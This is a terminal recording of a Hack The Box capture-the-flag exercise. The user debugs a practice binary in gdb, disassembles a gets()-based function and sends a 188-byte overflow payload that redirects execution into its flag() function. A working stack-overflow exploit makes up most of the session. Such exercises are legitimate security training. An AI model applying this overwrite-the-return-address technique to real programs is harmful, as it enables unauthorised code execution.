@@ -1,0 +1,200 @@
+Script started on 2021-01-11 19:51:32-0800
+ubuntu@ubuntu:~/CTF/hackthebox$ gdb ./vuln 
+GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./vuln...(no debugging symbols found)...done.
+gdb-peda$ bbrek ak flag
+Breakpoint 1 at 0x80491e6
+gdb-peda$ break info func flag
+All functions matching regular expression "flag":
+
+Non-debugging symbols:
+0x080491e2  flag
+gdb-peda$ diss ass vuln
+Dump of assembler code for function vuln:
+   0x08049272 <+0>:	push   ebp
+   0x08049273 <+1>:	mov    ebp,esp
+   0x08049275 <+3>:	push   ebx
+   0x08049276 <+4>:	sub    esp,0xb4
+   0x0804927c <+10>:	call   0x8049120 <__x86.get_pc_thunk.bx>
+   0x08049281 <+15>:	add    ebx,0x2d7f
+   0x08049287 <+21>:	sub    esp,0xc
+   0x0804928a <+24>:	lea    eax,[ebp-0xb8]
+   0x08049290 <+30>:	push   eax
+   0x08049291 <+31>:	call   0x8049040 <gets@plt>
+   0x08049296 <+36>:	add    esp,0x10
+   0x08049299 <+39>:	sub    esp,0xc
+   0x0804929c <+42>:	lea    eax,[ebp-0xb8]
+   0x080492a2 <+48>:	push   eax
+   0x080492a3 <+49>:	call   0x8049070 <puts@plt>
+   0x080492a8 <+54>:	add    esp,0x10
+   0x080492ab <+57>:	nop
+   0x080492ac <+58>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x080492af <+61>:	leave  
+   0x080492b0 <+62>:	ret    
+End of assembler dump.
+gdb-peda$ break *0x080492ab
+Breakpoint 2 at 0x80492ab
+gdb-peda$ r < <()p)y)t)h)o)n) )-)c) )")")p")r")i")n")t")("))")')")A)")')") )")*)") )")1)")8)")8)") ")+") ")'")'") ")[1@0[1@8
+Starting program: /home/ubuntu/CTF/hackthebox/vuln < <(python -c "print('A' * 188) + '\xe2\x91\x04\x08' ")
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAâ‘
+[----------------------------------registers-----------------------------------]
+EAX: 0xc1 
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd158 ("AAAA\342\221\004\b")
+ESP: 0xffffd0a0 ('A' <repeats 188 times>, "\342\221\004\b")
+EIP: 0x80492ab (<vuln+57>:	nop)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80492a2 <vuln+48>:	push   eax
+   0x80492a3 <vuln+49>:	call   0x8049070 <puts@plt>
+   0x80492a8 <vuln+54>:	add    esp,0x10
+=> 0x80492ab <vuln+57>:	nop
+   0x80492ac <vuln+58>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x80492af <vuln+61>:	leave  
+   0x80492b0 <vuln+62>:	ret    
+   0x80492b1 <main>:	lea    ecx,[esp+0x4]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0a0 ('A' <repeats 188 times>, "\342\221\004\b")
+0004| 0xffffd0a4 ('A' <repeats 184 times>, "\342\221\004\b")
+0008| 0xffffd0a8 ('A' <repeats 180 times>, "\342\221\004\b")
+0012| 0xffffd0ac ('A' <repeats 176 times>, "\342\221\004\b")
+0016| 0xffffd0b0 ('A' <repeats 172 times>, "\342\221\004\b")
+0020| 0xffffd0b4 ('A' <repeats 168 times>, "\342\221\004\b")
+0024| 0xffffd0b8 ('A' <repeats 164 times>, "\342\221\004\b")
+0028| 0xffffd0bc ('A' <repeats 160 times>, "\342\221\004\b")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, 0x080492ab in vuln ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xc1 
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd158 ("AAAA\342\221\004\b")
+ESP: 0xffffd0a0 ('A' <repeats 188 times>, "\342\221\004\b")
+EIP: 0x80492ac (<vuln+58>:	mov    ebx,DWORD PTR [ebp-0x4])
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80492a3 <vuln+49>:	call   0x8049070 <puts@plt>
+   0x80492a8 <vuln+54>:	add    esp,0x10
+   0x80492ab <vuln+57>:	nop
+=> 0x80492ac <vuln+58>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x80492af <vuln+61>:	leave  
+   0x80492b0 <vuln+62>:	ret    
+   0x80492b1 <main>:	lea    ecx,[esp+0x4]
+   0x80492b5 <main+4>:	and    esp,0xfffffff0
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0a0 ('A' <repeats 188 times>, "\342\221\004\b")
+0004| 0xffffd0a4 ('A' <repeats 184 times>, "\342\221\004\b")
+0008| 0xffffd0a8 ('A' <repeats 180 times>, "\342\221\004\b")
+0012| 0xffffd0ac ('A' <repeats 176 times>, "\342\221\004\b")
+0016| 0xffffd0b0 ('A' <repeats 172 times>, "\342\221\004\b")
+0020| 0xffffd0b4 ('A' <repeats 168 times>, "\342\221\004\b")
+0024| 0xffffd0b8 ('A' <repeats 164 times>, "\342\221\004\b")
+0028| 0xffffd0bc ('A' <repeats 160 times>, "\342\221\004\b")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080492ac in vuln ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xc1 
+EBX: 0x41414141 ('AAAA')
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd158 ("AAAA\342\221\004\b")
+ESP: 0xffffd0a0 ('A' <repeats 188 times>, "\342\221\004\b")
+EIP: 0x80492af (<vuln+61>:	leave)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80492a8 <vuln+54>:	add    esp,0x10
+   0x80492ab <vuln+57>:	nop
+   0x80492ac <vuln+58>:	mov    ebx,DWORD PTR [ebp-0x4]
+=> 0x80492af <vuln+61>:	leave  
+   0x80492b0 <vuln+62>:	ret    
+   0x80492b1 <main>:	lea    ecx,[esp+0x4]
+   0x80492b5 <main+4>:	and    esp,0xfffffff0
+   0x80492b8 <main+7>:	push   DWORD PTR [ecx-0x4]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0a0 ('A' <repeats 188 times>, "\342\221\004\b")
+0004| 0xffffd0a4 ('A' <repeats 184 times>, "\342\221\004\b")
+0008| 0xffffd0a8 ('A' <repeats 180 times>, "\342\221\004\b")
+0012| 0xffffd0ac ('A' <repeats 176 times>, "\342\221\004\b")
+0016| 0xffffd0b0 ('A' <repeats 172 times>, "\342\221\004\b")
+0020| 0xffffd0b4 ('A' <repeats 168 times>, "\342\221\004\b")
+0024| 0xffffd0b8 ('A' <repeats 164 times>, "\342\221\004\b")
+0028| 0xffffd0bc ('A' <repeats 160 times>, "\342\221\004\b")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080492af in vuln ()
+gdb-peda$ ninfo framme
+Stack level 0, frame at 0xffffd160:
+ eip = 0x80492af in vuln; saved eip = 0x80491e2
+ called by frame at 0xffffd164
+ Arglist at 0xffffd158, args: 
+ Locals at 0xffffd158, Previous frame's sp is 0xffffd160
+ Saved registers:
+  ebx at 0xffffd154, ebp at 0xffffd158, eip at 0xffffd15c
+gdb-peda$ c
+Continuing.
+[----------------------------------registers-----------------------------------]
+EAX: 0xc1 
+EBX: 0x41414141 ('AAAA')
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd158 ("AAAAAAAA")
+EIP: 0x80491e6 (<flag+4>:	sub    esp,0x54)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491e2 <flag>:	push   ebp
+   0x80491e3 <flag+1>:	mov    ebp,esp
+   0x80491e5 <flag+3>:	push   ebx
+=> 0x80491e6 <flag+4>:	sub    esp,0x54
+   0x80491e9 <flag+7>:	call   0x8049120 <__x86.get_pc_thunk.bx>
+   0x80491ee <flag+12>:	add    ebx,0x2e12
+   0x80491f4 <flag+18>:	sub    esp,0x8
+   0x80491f7 <flag+21>:	lea    eax,[ebx-0x1ff8]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd158 ("AAAAAAAA")
+0004| 0xffffd15c ("AAAA")
+0008| 0xffffd160 --> 0x0 
+0012| 0xffffd164 --> 0xffffd224 --> 0xffffd3d7 ("/home/ubuntu/CTF/hackthebox/vuln")
+0016| 0xffffd168 --> 0xffffd22c --> 0xffffd3f8 ("CLUTTER_IM_MODULE=xim")
+0020| 0xffffd16c --> 0x3e8 
+0024| 0xffffd170 --> 0xffffd190 --> 0x1 
+0028| 0xffffd174 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x080491e6 in flag ()
+gdb-peda$ quit
+ubuntu@ubuntu:~/CTF/hackthebox$ exit
+exit
+
+Script done on 2021-01-11 20:03:02-0800
